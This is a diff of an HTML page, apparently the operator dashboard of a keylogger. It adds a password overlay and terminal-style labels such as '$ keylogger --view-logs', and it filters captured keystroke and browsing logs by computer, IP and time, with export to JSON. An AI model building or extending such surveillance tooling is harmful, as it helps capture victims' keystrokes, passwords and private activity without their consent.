@@ -5,37 +5,80 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>記錄查看器</title>
     <link rel="stylesheet" href="./css/style.css">
+    <!-- 添加圖標 -->
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wA=">
+    <link rel="shortcut icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8A////AAAAAAAAAAAAAQEBGgAAAC0AAAAtAAAALQAAAC0AAAAtAAAALQAAAC0AAAAtAAAALQAAABoAAAAAAAAAAP///wD///8AAAAAAAAAAAAREREyMTExZjExMWYxMTFmMTExZjExMWYxMTFmMTExZjExMWYxMTEyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiIiIQIiIiVCIiIqoiIiLqIiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi6iIiIqoiIiJUIiIiEAAAAAAAAAAAIiIiECIiIqoiIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIiqiIiIhAAAAAAAAAAACIiIlQiIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIlQAAAAAAAAAACIiIhAiIiKqIiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi/yIiIqoiIiIQAAAAAAAAAAAiIiIQIiIiVCIiIqoiIiLqIiIi/yIiIv8iIiL/IiIi/yIiIv8iIiL/IiIi6iIiIqoiIiJUIiIiEAAAAAAAAAAA////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wA=">
+    <style>
+        .password-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .password-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        .password-container input {
+            margin: 10px 0;
+            padding: 5px;
+            width: 200px;
+        }
+        .password-container button {
+            margin-top: 10px;
+            padding: 5px 15px;
+            cursor: pointer;
+        }
+        .main-content {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>記錄查看器</h1>
-        <div class="controls">
-            <div class="control-group">
-                <select id="computerFilter" title="選擇電腦">
-                    <option value="">所有電腦</option>
-                </select>
-                <select id="ipFilter" title="選擇IP">
-                    <option value="">所有IP</option>
-                </select>
-                <select id="typeFilter" title="選擇記錄類型">
-                    <option value="">所有類型</option>
-                    <option value="keyboard">鍵盤記錄</option>
-                    <option value="browser">瀏覽記錄</option>
-                </select>
-            </div>
-            <div class="control-group">
-                <input type="datetime-local" id="startTime" title="開始時間">
-                <input type="datetime-local" id="endTime" title="結束時間">
-            </div>
-            <div class="control-group">
-                <input type="text" id="searchInput" placeholder="搜索關鍵字...">
-                <button id="exportBtn" title="導出當前篩選的記錄">導出記錄</button>
-            </div>
+    <div id="passwordOverlay" class="password-overlay">
+        <div class="password-container">
+            <h2>$ sudo login</h2>
+            <input type="password" id="passwordInput" placeholder="Enter password...">
+            <br>
+            <button onclick="checkPassword()">authenticate</button>
         </div>
-        <div id="status" class="status" style="display: none;"></div>
-        <div class="log-container" id="logs">
-            <div class="log-entry">
-                <div class="text-content">載入中...</div>
+    </div>
+    <div id="mainContent" class="main-content">
+        <div class="container">
+            <h1>$ keylogger --view-logs</h1>
+            <div class="controls">
+                <div class="control-group">
+                    <select id="computerFilter" title="選擇電腦">
+                        <option value="">$ grep --computer *</option>
+                    </select>
+                    <select id="ipFilter" title="選擇IP">
+                        <option value="">$ grep --ip *</option>
+                    </select>
+                    <select id="typeFilter" title="選擇記錄類型">
+                        <option value="">$ grep --type *</option>
+                        <option value="keyboard">$ grep --type keyboard</option>
+                        <option value="browser">$ grep --type browser</option>
+                    </select>
+                </div>
+                <div class="control-group">
+                    <input type="datetime-local" id="startTime" title="開始時間">
+                    <input type="datetime-local" id="endTime" title="結束時間">
+                </div>
+                <div class="control-group">
+                    <input type="text" id="searchInput" placeholder="$ grep -r">
+                    <button id="exportBtn" title="導出當前篩選的記錄">$ export > logs.json</button>
+                </div>
+            </div>
+            <div id="status" class="status" style="display: none;"></div>
+            <div class="log-container" id="logs">
             </div>
         </div>
     </div>
